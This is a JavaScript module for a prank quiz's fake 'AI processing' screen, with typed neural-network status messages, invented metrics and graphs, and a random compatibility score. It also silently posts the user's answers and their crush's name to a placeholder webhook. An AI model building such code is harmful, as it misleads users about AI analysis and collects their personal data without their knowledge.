/**
 * processing.js — Fake AI Processing Screen
 * Typing effect, progress bar, fake metrics, pulse graph, webhook POST.
 */
import gsap from 'gsap';

// Status messages for the typing effect
const STATUS_MESSAGES = [
  'Initializing emotional analysis engine...',
  'Loading neural network weights...',
  'Analyzing emotional patterns...',
  'Running deep learning model v3.2...',
  'Processing behavioral data points...',
  'Running neural compatibility network...',
  'Cross-referencing attachment patterns...',
  'Predicting romantic compatibility...',
  'Generating final compatibility score...',
];

// Webhook URL — replace with your endpoint
const WEBHOOK_URL = 'https://your-webhook-url.com/api/submit';

let typingInterval;
let progressInterval;
let pulseInterval;
let metricsTimeout;

/**
 * Start the fake processing sequence
 * @param {Object} data — { answers: number[], crushName: string }
 * @param {Function} onComplete — called with final "score" when done
 */
export function startProcessing(data, onComplete) {
  const statusEl = document.getElementById('process-status');
  const progressFill = document.getElementById('process-progress-fill');
  const percentEl = document.getElementById('process-percent');
  const metricsEl = document.getElementById('process-metrics');
  const pulseGraph = document.getElementById('pulse-graph');
  const confidenceEl = document.getElementById('metric-confidence');
  const layersEl = document.getElementById('metric-layers');

  let currentMsg = 0;
  let progress = 0;

  // Reset
  statusEl.textContent = '';
  progressFill.style.width = '0%';
  percentEl.textContent = '0%';
  metricsEl.classList.remove('visible');
  pulseGraph.classList.remove('visible');
  confidenceEl.textContent = '—';
  layersEl.textContent = '0 / 128';

  // ---- Typing effect ----
  function typeMessage(msg, callback) {
    let i = 0;
    statusEl.textContent = '';
    typingInterval = setInterval(() => {
      statusEl.textContent += msg[i];
      i++;
      if (i >= msg.length) {
        clearInterval(typingInterval);
        if (callback) setTimeout(callback, 400);
      }
    }, 30);
  }

  function cycleMessages() {
    if (currentMsg >= STATUS_MESSAGES.length) return;
    typeMessage(STATUS_MESSAGES[currentMsg], () => {
      currentMsg++;
      if (currentMsg < STATUS_MESSAGES.length) {
        cycleMessages();
      }
    });
  }

  cycleMessages();

  // ---- Progress bar ----
  progressInterval = setInterval(() => {
    progress += Math.random() * 3 + 0.5;
    if (progress > 100) progress = 100;

    progressFill.style.width = `${progress}%`;
    percentEl.textContent = `${Math.round(progress)}%`;

    if (progress >= 100) {
      clearInterval(progressInterval);
    }
  }, 150);

  // ---- Show metrics after 1.5s ----
  metricsTimeout = setTimeout(() => {
    metricsEl.classList.add('visible');

    // Animate confidence
    setTimeout(() => {
      confidenceEl.textContent = 'High';
      gsap.fromTo(confidenceEl, { scale: 1.3 }, { scale: 1, duration: 0.3 });
    }, 800);

    // Animate layers counter
    let layerCount = 0;
    const layerInterval = setInterval(() => {
      layerCount += Math.floor(Math.random() * 8) + 3;
      if (layerCount > 128) layerCount = 128;
      layersEl.textContent = `${layerCount} / 128`;
      if (layerCount >= 128) clearInterval(layerInterval);
    }, 100);
  }, 1500);

  // ---- Pulse graph ----
  setTimeout(() => {
    pulseGraph.classList.add('visible');
    startPulseGraph();
  }, 2000);

  // ---- Send webhook (fire and forget) ----
  try {
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        answers: data.answers,
        crushName: data.crushName,
        timestamp: new Date().toISOString(),
      }),
    }).catch(() => {
      // Silently fail — it's a prank after all
    });
  } catch (e) {
    // Ignore
  }

  // ---- Complete after ~7 seconds ----
  setTimeout(() => {
    cleanup();
    // Generate fake score (always high for fun)
    const score = Math.floor(Math.random() * 20) + 75; // 75–94
    if (onComplete) onComplete(score);
  }, 7000);
}

/**
 * Animated SVG pulse graph — fake data visualization
 */
function startPulseGraph() {
  const line = document.getElementById('pulse-line');
  let offset = 0;

  pulseInterval = setInterval(() => {
    offset++;
    let points = '';
    for (let x = 0; x < 200; x += 4) {
      const y =
        30 +
        Math.sin((x + offset * 3) * 0.05) * 15 +
        Math.sin((x + offset * 5) * 0.1) * 8 +
        Math.random() * 3;
      points += `${x},${y} `;
    }
    line.setAttribute('points', points.trim());
  }, 50);
}

/**
 * Cleanup intervals
 */
function cleanup() {
  clearInterval(typingInterval);
  clearInterval(progressInterval);
  clearInterval(pulseInterval);
  clearTimeout(metricsTimeout);
}

/**
 * Reset processing screen
 */
export function resetProcessing() {
  cleanup();
  const statusEl = document.getElementById('process-status');
  const progressFill = document.getElementById('process-progress-fill');
  const percentEl = document.getElementById('process-percent');
  const metricsEl = document.getElementById('process-metrics');
  const pulseGraph = document.getElementById('pulse-graph');

  statusEl.textContent = '';
  progressFill.style.width = '0%';
  percentEl.textContent = '0%';
  metricsEl.classList.remove('visible');
  pulseGraph.classList.remove('visible');
}

export default { startProcessing, resetProcessing };
